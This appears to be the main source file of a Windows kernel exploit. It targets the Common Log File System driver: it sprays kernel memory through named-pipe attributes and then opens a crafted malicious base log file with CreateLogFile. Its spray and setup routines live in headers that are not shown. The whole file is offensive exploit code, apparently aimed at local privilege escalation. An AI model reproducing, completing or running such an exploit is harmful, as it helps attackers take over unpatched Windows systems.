#pragma warning (disable : 4005)

#include <stdio.h>
#include <iostream>
#include <windows.h>
#include <clfsw32.h>
#include <ntstatus.h>
#include <processthreadsapi.h>
#include <tchar.h>
#include <tlhelp32.h>
#include "crc32.h"  
#include "head.h"  
#include "ntos.h"  
#include "spray.h"
#include "windows_api.h"
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "Clfsw32.lib")






int main() {
	InitEnvironment();
	sprayPipeAttributes();

	printf("[*] Press ENTER to clean up and exit.\n");

	// open crafted base log file
	std::wstring logFileName = L"LOG:";
	std::wstring inputName = L"C:\\Users\\vuduc\\Desktop\\mal";
	logFileName += inputName;
	HANDLE hLogFile = CreateLogFile(logFileName.c_str(), 0xc0010000, 3, 0, 4, 0);
	if (hLogFile == INVALID_HANDLE_VALUE) {
		printf("CreateLogFile failed with error %d\n", GetLastError());
		return 1;
	}
	else {
		printf("[+] Log file created successfully.\n");
	}

	getchar();
}